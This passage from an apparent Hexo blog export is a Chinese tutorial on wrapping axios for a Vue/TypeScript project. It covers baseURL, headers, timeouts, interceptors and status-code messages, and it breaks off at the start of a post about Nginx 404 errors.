或者 <code>http.ts</code> 文件，在文件中引入 axios 并对其进行封装配置，最后将其导出并挂载到 Vue 的原型上即可。此时，每次修改 axios 配置，只需要修改对应的文件即可，不会影响到不相关的功能。</p>\n<p>针对问题二，采用 axios 官方推荐的，通过配置项创建 axios 实例的方式进行配置封装。</p>\n<p>代码如下：</p>\n<figure class=\"highlight javascript\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"comment\">// http.js</span></span><br><span class=\"line\"><span class=\"keyword\">import</span> axios <span class=\"keyword\">from</span> <span class=\"string\">'axios'</span></span><br><span class=\"line\"><span class=\"comment\">// 创建 axios 实例</span></span><br><span class=\"line\"><span class=\"keyword\">const</span> service = axios.create(&#123;</span><br><span class=\"line\">  <span class=\"comment\">// 配置项</span></span><br><span class=\"line\">&#125;)</span><br></pre></td></tr></table></figure>\n<h3 id=\"根据环境设置-baseURL\"><a href=\"#根据环境设置-baseURL\" class=\"headerlink\" title=\"根据环境设置 baseURL\"></a>根据环境设置 baseURL</h3><p>baseURL 属性是请求地址前缀，将自动加在 url 前面，除非 url 是个绝对地址。正常情况下，在开发环境下和生产模式下有着不同的 baseURL，所以，我们需要根据不同的环境切换不同的 baseURL。</p>\n<p>在开发模式下，由于有着 devServer 的存在，需要根据固定的 url 前缀进行请求地址重写，所以，在开发环境下，将 baseURL 设为某个固定的值，比如：<code>/apis</code>。</p>\n<p>在生产模式下，根据 Java 模块的请求前缀的不同，可以设置不同的 baseURL。</p>\n<p>具体代码如下：</p>\n<figure class=\"highlight arduino\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"comment\">// 根据 process.env.NODE_ENV 区分状态，切换不同的 baseURL</span></span><br><span class=\"line\"><span class=\"keyword\">const</span> service = axios.create(&#123;</span><br><span class=\"line\">\tbaseURL: <span class=\"built_in\">process</span>.env.NODE_ENV === <span class=\"string\">'production'</span> ? `/java` : <span class=\"string\">'/apis'</span>,</span><br><span class=\"line\">&#125;)</span><br></pre></td></tr></table></figure>\n<h3 id=\"统一设置请求头\"><a href=\"#统一设置请求头\" class=\"headerlink\" title=\"统一设置请求头\"></a>统一设置请求头</h3><p>在这里和大家聊一个问题，什么是封装？在我看来，封装是通过更少的调用代码覆盖更多的调用场景。</p>\n<p>由于，大部分情况下，请求头都是固定的，只有少部分情况下，会需要一些特殊的请求头，所以，在这里，我采用的方案是，将普适性的请求头作为基础配置。当需要特殊请求头时，将特殊请求头作为参数传入，覆盖基础配置。</p>\n<p>代码如下：</p>\n<figure class=\"highlight actionscript\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"keyword\">const</span> service = axios.create(&#123;</span><br><span class=\"line\">    ...</span><br><span class=\"line\">\theaders: &#123;</span><br><span class=\"line\">        <span class=\"keyword\">get</span>: &#123;</span><br><span class=\"line\">          <span class=\"string\">'Content-Type'</span>: <span class=\"string\">'application/x-www-form-urlencoded;charset=utf-8'</span></span><br><span class=\"line\">          <span class=\"comment\">// 在开发中，一般还需要单点登录或者其他功能的通用请求头，可以一并配置进来</span></span><br><span class=\"line\">        &#125;,</span><br><span class=\"line\">        post: &#123;</span><br><span class=\"line\">          <span class=\"string\">'Content-Type'</span>: <span class=\"string\">'application/json;charset=utf-8'</span></span><br><span class=\"line\">          <span class=\"comment\">// 在开发中，一般还需要单点登录或者其他功能的通用请求头，可以一并配置进来</span></span><br><span class=\"line\">        &#125;</span><br><span class=\"line\">  &#125;,</span><br><span class=\"line\">&#125;)</span><br></pre></td></tr></table></figure>\n<h3 id=\"跨域、超时、响应码处理\"><a href=\"#跨域、超时、响应码处理\" class=\"headerlink\" title=\"跨域、超时、响应码处理\"></a>跨域、超时、响应码处理</h3><p>axios 中，提供是否允许跨域的属性——withCredentials，以及配置超时时间的属性——timeout，通过这两个属性，可以轻松处理跨域和超时的问题。</p>\n<p>下面，我们来说说响应码处理：</p>\n<p>axios 提供了 validateStatus 属性，用于定义对于给定的 HTTP 响应状态码是 resolve 或 reject promise。所以，正常设置的情况下，我们会将状态码为 2 系列或者 304 的请求设为 resolve 状态，其余为 reject 状态。结果就是，我们可以在业务代码里，使用 catch 统一捕获响应错误的请求，从而进行统一处理。</p>\n<p>但是，由于我在代码里面使用了 async-await，而众所周知，async-await 捕获 catch 的方式极为麻烦，所以，在此处，我选择将所有响应都设为 resolve 状态，统一在 then 处理。</p>\n<p>此部分代码如下：</p>\n<figure class=\"highlight actionscript\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"keyword\">const</span> service = axios.create(&#123;</span><br><span class=\"line\">\t<span class=\"comment\">// 跨域请求时是否需要使用凭证</span></span><br><span class=\"line\">\twithCredentials: <span class=\"literal\">true</span>,</span><br><span class=\"line\">    <span class=\"comment\">// 请求 30s 超时</span></span><br><span class=\"line\">\ttimeout: <span class=\"number\">30000</span>,</span><br><span class=\"line\">\tvalidateStatus: <span class=\"function\"><span class=\"keyword\">function</span> <span class=\"params\">()</span> </span>&#123;</span><br><span class=\"line\">\t\t<span class=\"comment\">// 使用async-await，处理reject情况较为繁琐，所以全部返回resolve，在业务代码中处理异常</span></span><br><span class=\"line\">\t\t<span class=\"keyword\">return</span> <span class=\"literal\">true</span></span><br><span class=\"line\">\t&#125;,</span><br><span class=\"line\">&#125;)</span><br></pre></td></tr></table></figure>\n<h3 id=\"请求、响应处理\"><a href=\"#请求、响应处理\" class=\"headerlink\" title=\"请求、响应处理\"></a>请求、响应处理</h3><p>在不使用 axios 的情况下，每次请求或者接受响应，都需要将请求或者响应序列化。</p>\n<p>而在 axios 中， <code>transformRequest</code> 允许在向服务器发送请求前，修改请求数据；<code>transformResponse</code> 在传递给 then/catch 前，允许修改响应数据。</p>\n<p>通过这两个钩子，可以省去大量重复的序列化代码。</p>\n<p>代码如下：</p>\n<figure class=\"highlight kotlin\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br><span class=\"line\">14</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"keyword\">const</span> service = axios.create(&#123;</span><br><span class=\"line\">    <span class=\"comment\">// 在向服务器发送请求前，序列化请求数据</span></span><br><span class=\"line\">    transformRequest: [function (<span class=\"keyword\">data</span>) &#123;</span><br><span class=\"line\">        <span class=\"keyword\">data</span> = JSON.stringify(<span class=\"keyword\">data</span>)</span><br><span class=\"line\">        <span class=\"keyword\">return</span> <span class=\"keyword\">data</span></span><br><span class=\"line\">    &#125;],</span><br><span class=\"line\">    <span class=\"comment\">// 在传递给 then/catch 前，修改响应数据</span></span><br><span class=\"line\">    transformResponse: [function (<span class=\"keyword\">data</span>) &#123;</span><br><span class=\"line\">        <span class=\"keyword\">if</span> (typeof <span class=\"keyword\">data</span> === <span class=\"string\">'string'</span> &amp;&amp; <span class=\"keyword\">data</span>.startsWith(<span class=\"string\">'&#123;'</span>)) &#123;</span><br><span class=\"line\">            <span class=\"keyword\">data</span> = JSON.parse(<span class=\"keyword\">data</span>)</span><br><span class=\"line\">        &#125;</span><br><span class=\"line\">        <span class=\"keyword\">return</span> <span class=\"keyword\">data</span></span><br><span class=\"line\">    &#125;]</span><br><span class=\"line\">&#125;)</span><br></pre></td></tr></table></figure>\n<h3 id=\"拦截器\"><a href=\"#拦截器\" class=\"headerlink\" title=\"拦截器\"></a>拦截器</h3><p>拦截器，分为请求拦截器以及响应拦截器，分别在请求或响应被 then 或 catch 处理前拦截它们。</p>\n<p>之前提到过，由于 async-await 中 catch 难以处理的问题，所以将出错的情况也作为 resolve 状态进行处理。但这带来了一个问题，请求或响应出错的情况下，结果没有数据协议中定义的 msg 字段（消息）。所以，我们需要在出错的时候，手动生成一个符合返回格式的返回数据。</p>\n<p>由于，在业务中，没有需要在请求拦截器中做额外处理的需求，所以，请求拦截器的 resolve 状态，只需直接返回就可以了。</p>\n<p>请求拦截器代码如下：</p>\n<figure class=\"highlight moonscript\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">// 请求拦截器</span><br><span class=\"line\">service.interceptors.request.use(<span class=\"function\"><span class=\"params\">(config)</span> =&gt;</span> &#123;</span><br><span class=\"line\">\t<span class=\"keyword\">return</span> config</span><br><span class=\"line\">&#125;, <span class=\"function\"><span class=\"params\">(<span class=\"built_in\">error</span>)</span> =&gt;</span> &#123;</span><br><span class=\"line\">\t// 错误抛到业务代码</span><br><span class=\"line\">    <span class=\"built_in\">error</span>.data = &#123;&#125;</span><br><span class=\"line\">    <span class=\"built_in\">error</span>.data.msg = <span class=\"string\">'服务器异常，请联系管理员！'</span></span><br><span class=\"line\">    <span class=\"keyword\">return</span> Promise.resolve(<span class=\"built_in\">error</span>)</span><br><span class=\"line\">&#125;)</span><br></pre></td></tr></table></figure>\n<p>再来聊聊响应拦截器，还是之前的那个问题，除了请求或响应错误，还有一种情况也会导致返回的消息体不符合协议规范，那就是状态码不为 2 系列或 304 时。此时，我们还是需要做一样的处理——手动生成一个符合返回格式的返回数据。但是，有一点不一样，我们还需要根据不同的状态码生成不同的提示信息，以方便处理上线后的问题。</p>\n<p>响应拦截器代码如下：</p>\n<figure class=\"highlight typescript\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br><span class=\"line\">14</span><br><span class=\"line\">15</span><br><span class=\"line\">16</span><br><span class=\"line\">17</span><br><span class=\"line\">18</span><br><span class=\"line\">19</span><br><span class=\"line\">20</span><br><span class=\"line\">21</span><br><span class=\"line\">22</span><br><span class=\"line\">23</span><br><span class=\"line\">24</span><br><span class=\"line\">25</span><br><span class=\"line\">26</span><br><span class=\"line\">27</span><br><span class=\"line\">28</span><br><span class=\"line\">29</span><br><span class=\"line\">30</span><br><span class=\"line\">31</span><br><span class=\"line\">32</span><br><span class=\"line\">33</span><br><span class=\"line\">34</span><br><span class=\"line\">35</span><br><span class=\"line\">36</span><br><span class=\"line\">37</span><br><span class=\"line\">38</span><br><span class=\"line\">39</span><br><span class=\"line\">40</span><br><span class=\"line\">41</span><br><span class=\"line\">42</span><br><span class=\"line\">43</span><br><span class=\"line\">44</span><br><span class=\"line\">45</span><br><span class=\"line\">46</span><br><span class=\"line\">47</span><br><span class=\"line\">48</span><br><span class=\"line\">49</span><br><span class=\"line\">50</span><br><span class=\"line\">51</span><br><span class=\"line\">52</span><br><span class=\"line\">53</span><br><span class=\"line\">54</span><br><span class=\"line\">55</span><br><span class=\"line\">56</span><br><span class=\"line\">57</span><br><span class=\"line\">58</span><br><span class=\"line\">59</span><br><span class=\"line\">60</span><br><span class=\"line\">61</span><br><span class=\"line\">62</span><br><span class=\"line\">63</span><br><span class=\"line\">64</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"comment\">// 根据不同的状态码，生成不同的提示信息</span></span><br><span class=\"line\"><span class=\"keyword\">const</span> showStatus = <span class=\"function\">(<span class=\"params\">status</span>) =&gt;</span> &#123;</span><br><span class=\"line\">    <span class=\"keyword\">let</span> message = <span class=\"string\">''</span></span><br><span class=\"line\">    <span class=\"comment\">// 这一坨代码可以使用策略模式进行优化</span></span><br><span class=\"line\">    <span class=\"keyword\">switch</span> (status) &#123;</span><br><span class=\"line\">        <span class=\"keyword\">case</span> <span class=\"number\">400</span>:</span><br><span class=\"line\">            message = <span class=\"string\">'请求错误(400)'</span></span><br><span class=\"line\">            <span class=\"keyword\">break</span></span><br><span class=\"line\">        <span class=\"keyword\">case</span> <span class=\"number\">401</span>:</span><br><span class=\"line\">            message = <span class=\"string\">'未授权，请重新登录(401)'</span></span><br><span class=\"line\">            <span class=\"keyword\">break</span></span><br><span class=\"line\">        <span class=\"keyword\">case</span> <span class=\"number\">403</span>:</span><br><span class=\"line\">            message = <span class=\"string\">'拒绝访问(403)'</span></span><br><span class=\"line\">            <span class=\"keyword\">break</span></span><br><span class=\"line\">        <span class=\"keyword\">case</span> <span class=\"number\">404</span>:</span><br><span class=\"line\">            message = <span class=\"string\">'请求出错(404)'</span></span><br><span class=\"line\">            <span class=\"keyword\">break</span></span><br><span class=\"line\">        <span class=\"keyword\">case</span> <span class=\"number\">408</span>:</span><br><span class=\"line\">            message = <span class=\"string\">'请求超时(408)'</span></span><br><span class=\"line\">            <span class=\"keyword\">break</span></span><br><span class=\"line\">        <span class=\"keyword\">case</span> <span class=\"number\">500</span>:</span><br><span class=\"line\">            message = <span class=\"string\">'服务器错误(500)'</span></span><br><span class=\"line\">            <span class=\"keyword\">break</span></span><br><span class=\"line\">        <span class=\"keyword\">case</span> <span class=\"number\">501</span>:</span><br><span class=\"line\">            message = <span class=\"string\">'服务未实现(501)'</span></span><br><span class=\"line\">            <span class=\"keyword\">break</span></span><br><span class=\"line\">        <span class=\"keyword\">case</span> <span class=\"number\">502</span>:</span><br><span class=\"line\">            message = <span class=\"string\">'网络错误(502)'</span></span><br><span class=\"line\">            <span class=\"keyword\">break</span></span><br><span class=\"line\">        <span class=\"keyword\">case</span> <span class=\"number\">503</span>:</span><br><span class=\"line\">            message = <span class=\"string\">'服务不可用(503)'</span></span><br><span class=\"line\">            <span class=\"keyword\">break</span></span><br><span class=\"line\">        <span class=\"keyword\">case</span> <span class=\"number\">504</span>:</span><br><span class=\"line\">            message = <span class=\"string\">'网络超时(504)'</span></span><br><span class=\"line\">            <span class=\"keyword\">break</span></span><br><span class=\"line\">        <span class=\"keyword\">case</span> <span class=\"number\">505</span>:</span><br><span class=\"line\">            message = <span class=\"string\">'HTTP版本不受支持(505)'</span></span><br><span class=\"line\">            <span class=\"keyword\">break</span></span><br><span class=\"line\">        <span class=\"keyword\">default</span>:</span><br><span class=\"line\">            message = <span class=\"string\">`连接出错(<span class=\"subst\">$&#123;status&#125;</span>)!`</span></span><br><span class=\"line\">    &#125;</span><br><span class=\"line\">    <span class=\"keyword\">return</span> <span class=\"string\">`<span class=\"subst\">$&#123;message&#125;</span>，请检查网络或联系管理员！`</span></span><br><span class=\"line\">&#125;</span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"comment\">// 响应拦截器</span></span><br><span class=\"line\">service.interceptors.response.use(<span class=\"function\">(<span class=\"params\">response</span>) =&gt;</span> &#123;</span><br><span class=\"line\">    <span class=\"keyword\">const</span> status = response.status</span><br><span class=\"line\">    <span class=\"keyword\">let</span> msg = <span class=\"string\">''</span></span><br><span class=\"line\">    <span class=\"keyword\">if</span> (status &lt; <span class=\"number\">200</span> || status &gt;= <span class=\"number\">300</span>) &#123;</span><br><span class=\"line\">        <span class=\"comment\">// 处理http错误，抛到业务代码</span></span><br><span class=\"line\">        msg = showStatus(status)</span><br><span class=\"line\">        <span class=\"keyword\">if</span> (<span class=\"keyword\">typeof</span> response.data === <span class=\"string\">'string'</span>) &#123;</span><br><span class=\"line\">            response.data = &#123; msg &#125;</span><br><span class=\"line\">        &#125; <span class=\"keyword\">else</span> &#123;</span><br><span class=\"line\">            response.data.msg = msg</span><br><span class=\"line\">        &#125;</span><br><span class=\"line\">    &#125;</span><br><span class=\"line\">    <span class=\"keyword\">return</span> response</span><br><span class=\"line\">&#125;, <span class=\"function\">(<span class=\"params\">error</span>) =&gt;</span> &#123;</span><br><span class=\"line\">    <span class=\"comment\">// 错误抛到业务代码</span></span><br><span class=\"line\">    error.data = &#123;&#125;</span><br><span class=\"line\">    error.data.msg = <span class=\"string\">'请求超时或服务器异常，请检查网络或联系管理员！'</span></span><br><span class=\"line\">    <span class=\"keyword\">return</span> <span class=\"built_in\">Promise</span>.resolve(error)</span><br><span class=\"line\">&#125;)</span><br></pre></td></tr></table></figure>\n<p><em>tips1：友情提示，上面那一坨 switch-case 代码，可以使用策略模式进行优化~</em></p>\n<p><em>tips2：如果有一些业务相关的需求，可以加在拦截器中，比如：loading、鉴权等~</em></p>\n<h3 id=\"支持-TypeScript\"><a href=\"#支持-TypeScript\" class=\"headerlink\" title=\"支持 TypeScript\"></a>支持 TypeScript</h3><p>由于前段时间，我在部门内推了 TypeScript，为了满足自己的强迫症，将所有 js 文件改写为了 ts 文件。由于 axios 本身有 TypeScript 相关的支持，所以只需要把对应的类型导入，然后赋值即可。</p>\n<h3 id=\"完整代码\"><a href=\"#完整代码\" class=\"headerlink\" title=\"完整代码\"></a>完整代码</h3><figure class=\"highlight typescript\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br><span class=\"line\">14</span><br><span class=\"line\">15</span><br><span class=\"line\">16</span><br><span class=\"line\">17</span><br><span class=\"line\">18</span><br><span class=\"line\">19</span><br><span class=\"line\">20</span><br><span class=\"line\">21</span><br><span class=\"line\">22</span><br><span class=\"line\">23</span><br><span class=\"line\">24</span><br><span class=\"line\">25</span><br><span class=\"line\">26</span><br><span class=\"line\">27</span><br><span class=\"line\">28</span><br><span class=\"line\">29</span><br><span class=\"line\">30</span><br><span class=\"line\">31</span><br><span class=\"line\">32</span><br><span class=\"line\">33</span><br><span class=\"line\">34</span><br><span class=\"line\">35</span><br><span class=\"line\">36</span><br><span class=\"line\">37</span><br><span class=\"line\">38</span><br><span class=\"line\">39</span><br><span class=\"line\">40</span><br><span class=\"line\">41</span><br><span class=\"line\">42</span><br><span class=\"line\">43</span><br><span class=\"line\">44</span><br><span class=\"line\">45</span><br><span class=\"line\">46</span><br><span class=\"line\">47</span><br><span class=\"line\">48</span><br><span class=\"line\">49</span><br><span class=\"line\">50</span><br><span class=\"line\">51</span><br><span class=\"line\">52</span><br><span class=\"line\">53</span><br><span class=\"line\">54</span><br><span class=\"line\">55</span><br><span class=\"line\">56</span><br><span class=\"line\">57</span><br><span class=\"line\">58</span><br><span class=\"line\">59</span><br><span class=\"line\">60</span><br><span class=\"line\">61</span><br><span class=\"line\">62</span><br><span class=\"line\">63</span><br><span class=\"line\">64</span><br><span class=\"line\">65</span><br><span class=\"line\">66</span><br><span class=\"line\">67</span><br><span class=\"line\">68</span><br><span class=\"line\">69</span><br><span class=\"line\">70</span><br><span class=\"line\">71</span><br><span class=\"line\">72</span><br><span class=\"line\">73</span><br><span class=\"line\">74</span><br><span class=\"line\">75</span><br><span class=\"line\">76</span><br><span class=\"line\">77</span><br><span class=\"line\">78</span><br><span class=\"line\">79</span><br><span class=\"line\">80</span><br><span class=\"line\">81</span><br><span class=\"line\">82</span><br><span class=\"line\">83</span><br><span class=\"line\">84</span><br><span class=\"line\">85</span><br><span class=\"line\">86</span><br><span class=\"line\">87</span><br><span class=\"line\">88</span><br><span class=\"line\">89</span><br><span class=\"line\">90</span><br><span class=\"line\">91</span><br><span class=\"line\">92</span><br><span class=\"line\">93</span><br><span class=\"line\">94</span><br><span class=\"line\">95</span><br><span class=\"line\">96</span><br><span class=\"line\">97</span><br><span class=\"line\">98</span><br><span class=\"line\">99</span><br><span class=\"line\">100</span><br><span class=\"line\">101</span><br><span class=\"line\">102</span><br><span class=\"line\">103</span><br><span class=\"line\">104</span><br><span class=\"line\">105</span><br><span class=\"line\">106</span><br><span class=\"line\">107</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"comment\">// http.ts</span></span><br><span class=\"line\"><span class=\"keyword\">import</span> axios, &#123; AxiosRequestConfig, AxiosResponse &#125; <span class=\"keyword\">from</span> <span class=\"string\">'axios'</span></span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"keyword\">const</span> showStatus = <span class=\"function\">(<span class=\"params\">status: <span class=\"built_in\">number</span></span>) =&gt;</span> &#123;</span><br><span class=\"line\">  <span class=\"keyword\">let</span> message = <span class=\"string\">''</span></span><br><span class=\"line\">  <span class=\"keyword\">switch</span> (status) &#123;</span><br><span class=\"line\">    <span class=\"keyword\">case</span> <span class=\"number\">400</span>:</span><br><span class=\"line\">      message = <span class=\"string\">'请求错误(400)'</span></span><br><span class=\"line\">      <span class=\"keyword\">break</span></span><br><span class=\"line\">    <span class=\"keyword\">case</span> <span class=\"number\">401</span>:</span><br><span class=\"line\">      message = <span class=\"string\">'未授权，请重新登录(401)'</span></span><br><span class=\"line\">      <span class=\"keyword\">break</span></span><br><span class=\"line\">    <span class=\"keyword\">case</span> <span class=\"number\">403</span>:</span><br><span class=\"line\">      message = <span class=\"string\">'拒绝访问(403)'</span></span><br><span class=\"line\">      <span class=\"keyword\">break</span></span><br><span class=\"line\">    <span class=\"keyword\">case</span> <span class=\"number\">404</span>:</span><br><span class=\"line\">      message = <span class=\"string\">'请求出错(404)'</span></span><br><span class=\"line\">      <span class=\"keyword\">break</span></span><br><span class=\"line\">    <span class=\"keyword\">case</span> <span class=\"number\">408</span>:</span><br><span class=\"line\">      message = <span class=\"string\">'请求超时(408)'</span></span><br><span class=\"line\">      <span class=\"keyword\">break</span></span><br><span class=\"line\">    <span class=\"keyword\">case</span> <span class=\"number\">500</span>:</span><br><span class=\"line\">      message = <span class=\"string\">'服务器错误(500)'</span></span><br><span class=\"line\">      <span class=\"keyword\">break</span></span><br><span class=\"line\">    <span class=\"keyword\">case</span> <span class=\"number\">501</span>:</span><br><span class=\"line\">      message = <span class=\"string\">'服务未实现(501)'</span></span><br><span class=\"line\">      <span class=\"keyword\">break</span></span><br><span class=\"line\">    <span class=\"keyword\">case</span> <span class=\"number\">502</span>:</span><br><span class=\"line\">      message = <span class=\"string\">'网络错误(502)'</span></span><br><span class=\"line\">      <span class=\"keyword\">break</span></span><br><span class=\"line\">    <span class=\"keyword\">case</span> <span class=\"number\">503</span>:</span><br><span class=\"line\">      message = <span class=\"string\">'服务不可用(503)'</span></span><br><span class=\"line\">      <span class=\"keyword\">break</span></span><br><span class=\"line\">    <span class=\"keyword\">case</span> <span class=\"number\">504</span>:</span><br><span class=\"line\">      message = <span class=\"string\">'网络超时(504)'</span></span><br><span class=\"line\">      <span class=\"keyword\">break</span></span><br><span class=\"line\">    <span class=\"keyword\">case</span> <span class=\"number\">505</span>:</span><br><span class=\"line\">      message = <span class=\"string\">'HTTP版本不受支持(505)'</span></span><br><span class=\"line\">      <span class=\"keyword\">break</span></span><br><span class=\"line\">    <span class=\"keyword\">default</span>:</span><br><span class=\"line\">      message = <span class=\"string\">`连接出错(<span class=\"subst\">$&#123;status&#125;</span>)!`</span></span><br><span class=\"line\">  &#125;</span><br><span class=\"line\">  <span class=\"keyword\">return</span> <span class=\"string\">`<span class=\"subst\">$&#123;message&#125;</span>，请检查网络或联系管理员！`</span></span><br><span class=\"line\">&#125;</span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"keyword\">const</span> service = axios.create(&#123;</span><br><span class=\"line\">  <span class=\"comment\">// 联调</span></span><br><span class=\"line\">  baseURL: process.env.NODE_ENV === <span class=\"string\">'production'</span> ? <span class=\"string\">`/`</span> : <span class=\"string\">'/apis'</span>,</span><br><span class=\"line\">  headers: &#123;</span><br><span class=\"line\">    <span class=\"keyword\">get</span>: &#123;</span><br><span class=\"line\">      <span class=\"string\">'Content-Type'</span>: <span class=\"string\">'application/x-www-form-urlencoded;charset=utf-8'</span></span><br><span class=\"line\">    &#125;,</span><br><span class=\"line\">    post: &#123;</span><br><span class=\"line\">      <span class=\"string\">'Content-Type'</span>: <span class=\"string\">'application/json;charset=utf-8'</span></span><br><span class=\"line\">    &#125;</span><br><span class=\"line\">  &#125;,</span><br><span class=\"line\">  <span class=\"comment\">// 是否跨站点访问控制请求</span></span><br><span class=\"line\">  withCredentials: <span class=\"literal\">true</span>,</span><br><span class=\"line\">  timeout: <span class=\"number\">30000</span>,</span><br><span class=\"line\">  transformRequest: [<span class=\"function\">(<span class=\"params\">data</span>) =&gt;</span> &#123;</span><br><span class=\"line\">    data = <span class=\"built_in\">JSON</span>.stringify(data)</span><br><span class=\"line\">    <span class=\"keyword\">return</span> data</span><br><span class=\"line\">  &#125;],</span><br><span class=\"line\">  validateStatus () &#123;</span><br><span class=\"line\">    <span class=\"comment\">// 使用async-await，处理reject情况较为繁琐，所以全部返回resolve，在业务代码中处理异常</span></span><br><span class=\"line\">    <span class=\"keyword\">return</span> <span class=\"literal\">true</span></span><br><span class=\"line\">  &#125;,</span><br><span class=\"line\">  transformResponse: [<span class=\"function\">(<span class=\"params\">data</span>) =&gt;</span> &#123;</span><br><span class=\"line\">    <span class=\"keyword\">if</span> (<span class=\"keyword\">typeof</span> data === <span class=\"string\">'string'</span> &amp;&amp; data.startsWith(<span class=\"string\">'&#123;'</span>)) &#123;</span><br><span class=\"line\">      data = <span class=\"built_in\">JSON</span>.parse(data)</span><br><span class=\"line\">    &#125;</span><br><span class=\"line\">    <span class=\"keyword\">return</span> data</span><br><span class=\"line\">  &#125;]</span><br><span class=\"line\">&#125;)</span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"comment\">// 请求拦截器</span></span><br><span class=\"line\">service.interceptors.request.use(<span class=\"function\">(<span class=\"params\">config: AxiosRequestConfig</span>) =&gt;</span> &#123;</span><br><span class=\"line\">    <span class=\"keyword\">return</span> config</span><br><span class=\"line\">&#125;, <span class=\"function\">(<span class=\"params\">error</span>) =&gt;</span> &#123;</span><br><span class=\"line\">    <span class=\"comment\">// 错误抛到业务代码</span></span><br><span class=\"line\">    error.data = &#123;&#125;</span><br><span class=\"line\">    error.data.msg = <span class=\"string\">'服务器异常，请联系管理员！'</span></span><br><span class=\"line\">    <span class=\"keyword\">return</span> <span class=\"built_in\">Promise</span>.resolve(error)</span><br><span class=\"line\">&#125;)</span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"comment\">// 响应拦截器</span></span><br><span class=\"line\">service.interceptors.response.use(<span class=\"function\">(<span class=\"params\">response: AxiosResponse</span>) =&gt;</span> &#123;</span><br><span class=\"line\">    <span class=\"keyword\">const</span> status = response.status</span><br><span class=\"line\">    <span class=\"keyword\">let</span> msg = <span class=\"string\">''</span></span><br><span class=\"line\">    <span class=\"keyword\">if</span> (status &lt; <span class=\"number\">200</span> || status &gt;= <span class=\"number\">300</span>) &#123;</span><br><span class=\"line\">        <span class=\"comment\">// 处理http错误，抛到业务代码</span></span><br><span class=\"line\">        msg = showStatus(status)</span><br><span class=\"line\">        <span class=\"keyword\">if</span> (<span class=\"keyword\">typeof</span> response.data === <span class=\"string\">'string'</span>) &#123;</span><br><span class=\"line\">            response.data = &#123;msg&#125;</span><br><span class=\"line\">        &#125; <span class=\"keyword\">else</span> &#123;</span><br><span class=\"line\">            response.data.msg = msg</span><br><span class=\"line\">        &#125;</span><br><span class=\"line\">    &#125;</span><br><span class=\"line\">    <span class=\"keyword\">return</span> response</span><br><span class=\"line\">&#125;, <span class=\"function\">(<span class=\"params\">error</span>) =&gt;</span> &#123;</span><br><span class=\"line\">    <span class=\"comment\">// 错误抛到业务代码</span></span><br><span class=\"line\">    error.data = &#123;&#125;</span><br><span class=\"line\">    error.data.msg = <span class=\"string\">'请求超时或服务器异常，请检查网络或联系管理员！'</span></span><br><span class=\"line\">    <span class=\"keyword\">return</span> <span class=\"built_in\">Promise</span>.resolve(error)</span><br><span class=\"line\">&#125;)</span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"keyword\">export</span> <span class=\"keyword\">default</span> service</span><br></pre></td></tr></table></figure>"},{"layout":"post","title":"Nginx 服务部署 Vue 项目后,出现 404 问题","abbrlink":59640,"_content":"\n### 前言\n\n在本地与部署线上环境后都没有问题，使用‘history’路由模式，部署线上环境后，首页能正常访问，点击其他页面，出现 404 Not Found\n\n<!--more-->\n\n### 